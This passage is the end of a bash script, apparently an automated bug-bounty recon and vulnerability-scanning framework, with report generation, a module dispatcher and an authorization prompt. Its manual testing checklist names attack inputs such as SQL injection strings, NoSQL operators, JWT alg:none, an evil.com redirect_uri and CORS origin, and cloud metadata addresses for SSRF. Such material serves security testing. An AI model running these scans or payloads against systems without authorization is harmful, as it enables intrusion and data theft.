$(cat "$WORKSPACE/paths/403_bypass.txt" 2>/dev/null || echo "None")
\`\`\`

### Exposed Files
\`\`\`
$(head -20 "$WORKSPACE/vulns/misconfig/sensitive_files.txt" 2>/dev/null || echo "None")
\`\`\`

---

## IDOR Priority
\`\`\`
$(head -50 "$WORKSPACE/classified/idor/IDOR_PRIORITY.txt" 2>/dev/null || echo "None")
\`\`\`

## BAC Priority
\`\`\`
$(head -50 "$WORKSPACE/classified/bac/BAC_PRIORITY.txt" 2>/dev/null || echo "None")
\`\`\`

## OAuth Priority
\`\`\`
$(head -30 "$WORKSPACE/classified/oauth/OAUTH_PRIORITY.txt" 2>/dev/null || echo "None")
\`\`\`

---

## Manual Testing Checklist

### IDOR
- [ ] 2 accounts + Autorize/Auth Analyzer in Burp
- [ ] Load \`classified/idor/IDOR_PRIORITY.txt\` as Burp scope
- [ ] Test numeric IDs, UUIDs, base64 IDs across accounts
- [ ] Horizontal (user→user) + vertical (user→admin) escalation
- [ ] Predictable patterns: sequential, date-based, ULID

### BAC (A01)
- [ ] Unauthenticated → check \`bac_confirmed_unauthed.txt\`
- [ ] Low-priv vs admin → load \`BAC_PRIORITY.txt\` with low-priv cookie
- [ ] HTTP method switching on privileged endpoints
- [ ] Role param tampering: role=admin, is_admin=true
- [ ] API versioning: /v1/admin → /v2/admin

### OAuth / Auth
- [ ] redirect_uri bypass with evil.com
- [ ] Missing state param (CSRF)
- [ ] PKCE absence → code interception
- [ ] JWT alg:none / weak HS256 secret
- [ ] Password reset link reuse/no expiry
- [ ] Token in URL (check \`oauth_token_in_url.txt\`)

### XSS
- [ ] Validate dalfox results manually in browser
- [ ] Stored XSS in profile/comments/usernames
- [ ] DOM XSS via \`dom_xss_sinks.txt\`
- [ ] postMessage XSS (\`postmessage_usage.txt\`)
- [ ] CSP bypass (hosts without CSP in \`no_csp.txt\`)

### SQLi
- [ ] Review sqlmap output dirs
- [ ] Manual: ' AND 1=1--, SLEEP(5), error-based
- [ ] Second-order SQLi in stored values
- [ ] NoSQLi: [\$ne]=, [\$regex]= on MongoDB endpoints

### SSRF
- [ ] Burp Collaborator on \`gf/ssrf.txt\`
- [ ] Cloud metadata: 169.254.169.254 (AWS), metadata.google.internal (GCP)
- [ ] Blind via OOB DNS (interactsh)

### CSRF / CORS
- [ ] Open PoC files while logged in
- [ ] CORS credentialed request with evil.com origin
- [ ] SameSite=None without Secure flag

---
*BUG Framework v${VERSION} · ${DOMAIN} · ${DT}*
MDEOF

    log_ok "Markdown report → $RPT/report.md"
}

# ══════════════════════════════════════════════════════
# FINAL SUMMARY
# ══════════════════════════════════════════════════════
print_summary() {
    local END_T; END_T=$(date +%s)
    local DUR_M=$(( (END_T - START_TIME) / 60 ))
    local RPT="$WORKSPACE/reports"

    local nc; nc=$(cnt "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt")
    local nx; nx=$(cnt "$WORKSPACE/vulns/xss/dalfox_results.txt")
    local nl; nl=$(cnt "$WORKSPACE/vulns/lfi/lfi_confirmed.txt")
    local ns; ns=$(cnt "$WORKSPACE/vulns/ssrf/ssrf_hits.txt")
    local nb; nb=$(cnt "$WORKSPACE/vulns/idor/bac_findings.txt")
    local nse; nse=$(cnt "$WORKSPACE/js/secrets_found.txt")
    local ncr; ncr=$(cnt "$WORKSPACE/vulns/csrf/cors_misconfig.txt")

    echo ""
    echo -e "${BOLD}${CYAN}  ╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}  ║          🐛  BUG FRAMEWORK v${VERSION} — SCAN COMPLETE               ║${NC}"
    echo -e "${BOLD}${CYAN}  ╠═══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  Target    : ${BOLD}${WHITE}${DOMAIN}${NC}"
    echo -e "${CYAN}  ║${NC}  Workspace : ${DIM}${WORKSPACE}${NC}"
    echo -e "${CYAN}  ║${NC}  Duration  : ${BOLD}${DUR_M} minutes${NC}"
    echo -e "${BOLD}${CYAN}  ╠═══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}HTML Report :${NC} $RPT/report.html"
    echo -e "${CYAN}  ║${NC}  ${GREEN}MD Report   :${NC} $RPT/report.md"
    echo -e "${BOLD}${CYAN}  ╠═══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${RED}Critical/High${NC}: ${nc}  ${MAGENTA}XSS${NC}: ${nx}  ${RED}LFI${NC}: ${nl}  ${ORANGE}SSRF${NC}: ${ns}"
    echo -e "${CYAN}  ║${NC}  ${YELLOW}BAC Unauthed${NC}: ${nb}  ${RED}Secrets${NC}: ${nse}  ${MAGENTA}CORS${NC}: ${ncr}"
    echo -e "${BOLD}${CYAN}  ╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${YELLOW}⚡ NEXT STEPS:${NC}"
    echo -e "     1.  ${CYAN}xdg-open $RPT/report.html${NC}"
    echo -e "     2.  ${CYAN}cat $WORKSPACE/vulns/nuclei/nuclei_critical_high.txt${NC}"
    echo -e "     3.  ${CYAN}cat $WORKSPACE/classified/idor/IDOR_PRIORITY.txt${NC}"
    echo -e "     4.  ${CYAN}cat $WORKSPACE/classified/bac/bac_confirmed_unauthed.txt${NC}"
    echo -e "     5.  ${CYAN}cat $WORKSPACE/classified/oauth/OAUTH_PRIORITY.txt${NC}"
    echo -e "     6.  ${CYAN}cat $WORKSPACE/js/secrets_found.txt${NC}"
    echo ""
}

# ══════════════════════════════════════════════════════
# SCOPE MODE
# ══════════════════════════════════════════════════════
run_scope() {
    log_section "SCOPE MODE — MULTI-DOMAIN SCAN"
    [[ ! -f "$SCOPE_FILE" ]] && { log_err "Scope file not found: $SCOPE_FILE"; exit 1; }
    log_info "Scanning $(wc -l < "$SCOPE_FILE") domains from $SCOPE_FILE"
    while IFS= read -r target; do
        [[ -z "$target" || "$target" == "#"* ]] && continue
        log_step "Starting: $target"
        DOMAIN="$target"
        setup_workspace
        run_mod subdomains  mod_subdomains
        run_mod httpx       mod_httpx
        run_mod urls        mod_urls
        run_mod js          mod_js
        run_mod paths       mod_paths
        run_mod nuclei      mod_nuclei
        run_mod xss         mod_xss
        run_mod ssrf        mod_ssrf
        run_mod lfi         mod_lfi
        run_mod csrf        mod_csrf
        run_mod cors        mod_cors
        run_mod idor        mod_idor
        run_mod oauth       mod_oauth
        run_mod exposure    mod_exposure
        run_mod classify    mod_classify
        mod_report
        log_ok "Done: $target → $WORKSPACE/reports/report.html"
    done < "$SCOPE_FILE"
    log_ok "All targets complete!"
}

# ══════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════
main() {
    parse_args "$@"
    print_banner

    export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
    export GOPATH="$HOME/go"

    # Standalone utilities
    if [[ "$F_INSTALL" == true ]]; then
        LOG_MASTER="/tmp/bug_install.log"; touch "$LOG_MASTER"
        install_tools; exit 0
    fi
    if [[ "$F_UPDATE_NUCLEI" == true ]]; then
        nuclei -update-templates; exit 0
    fi

    # Domain required for everything else
    [[ -z "$DOMAIN" && "$M_SCOPE" == false ]] && show_help

    # Scope mode
    if [[ "$M_SCOPE" == true ]]; then
        DOMAIN="scope-mode"
        setup_workspace
        run_scope
        exit 0
    fi

    # Authorization gate
    if [[ -z "${BUG_SKIP_CONFIRM:-}" ]]; then
        echo ""
        echo -e "  ${SYM_WARN} ${BOLD}${YELLOW}AUTHORIZATION CHECK${NC}"
        echo -e "  ${DIM}Target: $DOMAIN${NC}"
        echo -en "  ${YELLOW}Do you have written authorization to test this target? [y/N]: ${NC}"
        read -r confirm
        [[ ! "$confirm" =~ ^[Yy]$ ]] && { echo -e "${SYM_FAIL} Aborting."; exit 1; }
    fi

    setup_workspace

    # ── Focused modes ──────────────────────────────────

    if [[ "$M_SUB" == true ]]; then
        run_mod subdomains mod_subdomains; run_mod httpx mod_httpx
        log_ok "Subs: $(cnt "$WORKSPACE/subdomains/all_subdomains.txt") | Live: $(cnt "$WORKSPACE/subdomains/live_urls.txt")"
        exit 0
    fi

    if [[ "$M_URL" == true ]]; then
        ensure_live; run_mod urls mod_urls; exit 0
    fi

    if [[ "$M_WE" == true ]]; then
        ensure_live; run_mod urls mod_urls; run_mod classify mod_classify; exit 0
    fi

    if [[ "$M_JS" == true ]]; then
        ensure_urls; run_mod js mod_js; exit 0
    fi

    if [[ "$M_FUZZ" == true ]]; then
        ensure_live; run_mod paths mod_paths; exit 0
    fi

    if [[ "$M_PORTS" == true ]]; then
        run_mod subdomains mod_subdomains; run_mod httpx mod_httpx; mod_ports; exit 0
    fi

    if [[ "$M_NUCLEI_ONLY" == true ]]; then
        ensure_live; run_mod nuclei mod_nuclei; exit 0
    fi

    if [[ "$M_XSS" == true ]]; then
        ensure_urls; run_mod xss mod_xss; exit 0
    fi

    if [[ "$M_SQLI" == true ]]; then
        ensure_urls; run_mod sqli mod_sqli; exit 0
    fi

    if [[ "$M_SSRF" == true ]]; then
        ensure_urls; run_mod ssrf mod_ssrf; exit 0
    fi

    if [[ "$M_LFI" == true ]]; then
        ensure_urls; run_mod lfi mod_lfi; exit 0
    fi

    if [[ "$M_CSRF" == true ]]; then
        ensure_live; run_mod csrf mod_csrf; run_mod cors mod_cors; exit 0
    fi

    if [[ "$M_CORS" == true ]]; then
        ensure_live; run_mod cors mod_cors; exit 0
    fi

    if [[ "$M_IDOR" == true ]]; then
        ensure_urls; run_mod idor mod_idor; run_mod classify mod_classify; exit 0
    fi

    if [[ "$M_OAUTH" == true ]]; then
        ensure_urls; run_mod oauth mod_oauth; exit 0
    fi

    if [[ "$M_TECH" == true ]]; then
        ensure_live; run_mod tech mod_tech; exit 0
    fi

    if [[ "$M_WAF" == true ]]; then
        ensure_live; run_mod waf mod_waf; exit 0
    fi

    if [[ "$M_API" == true ]]; then
        ensure_live; run_mod api_schema mod_api_schema; exit 0
    fi

    if [[ "$M_PMF" == true ]]; then
        ensure_urls; run_mod param_fuzz mod_param_fuzz; exit 0
    fi

    if [[ "$M_VULN" == true ]]; then
        ensure_urls
        run_mod nuclei  mod_nuclei
        run_mod xss     mod_xss
        run_mod sqli    mod_sqli
        run_mod ssrf    mod_ssrf
        run_mod lfi     mod_lfi
        run_mod csrf    mod_csrf
        run_mod cors    mod_cors
        run_mod idor    mod_idor
        run_mod oauth   mod_oauth
        mod_report; exit 0
    fi

    if [[ "$M_REPORT" == true ]]; then
        mod_report; exit 0
    fi

    # ── Full scan ──────────────────────────────────────

    # -one mode: skip subdomain enum
    if [[ "$M_ONE" == true ]]; then
        echo "https://$DOMAIN" > "$WORKSPACE/subdomains/live_urls.txt"
        echo "$DOMAIN" > "$WORKSPACE/subdomains/all_subdomains.txt"
        echo "$DOMAIN" > "$WORKSPACE/subdomains/resolved_domains.txt"
        touch "$WORKSPACE/subdomains/status_200.txt" \
              "$WORKSPACE/subdomains/status_403.txt" \
              "$WORKSPACE/subdomains/tech_stack.txt"
        log_ok "-one mode: subdomain enum skipped"
    else
        run_mod subdomains mod_subdomains
    fi

    run_mod httpx      mod_httpx

    [[ "$F_QUICK" == false ]] && run_mod ports mod_ports

    run_mod urls       mod_urls
    run_mod js         mod_js

    if [[ "$F_QUICK" == false ]]; then
        run_mod paths    mod_paths
        run_mod exposure mod_exposure
    fi

    run_mod nuclei     mod_nuclei
    run_mod waf        mod_waf
    run_mod api_schema mod_api_schema
    run_mod xss        mod_xss

    if [[ "$F_QUICK" == false ]]; then
        run_mod sqli   mod_sqli
    fi

    run_mod ssrf       mod_ssrf
    run_mod lfi        mod_lfi
    run_mod param_fuzz mod_param_fuzz
    run_mod csrf       mod_csrf
    run_mod cors       mod_cors
    run_mod idor       mod_idor
    run_mod oauth      mod_oauth

    if [[ "$F_QUICK" == false ]]; then
        run_mod tech       mod_tech
        run_mod screenshots mod_screenshots
    fi

    run_mod classify   mod_classify
    mod_report
    print_summary
}

main "$@"
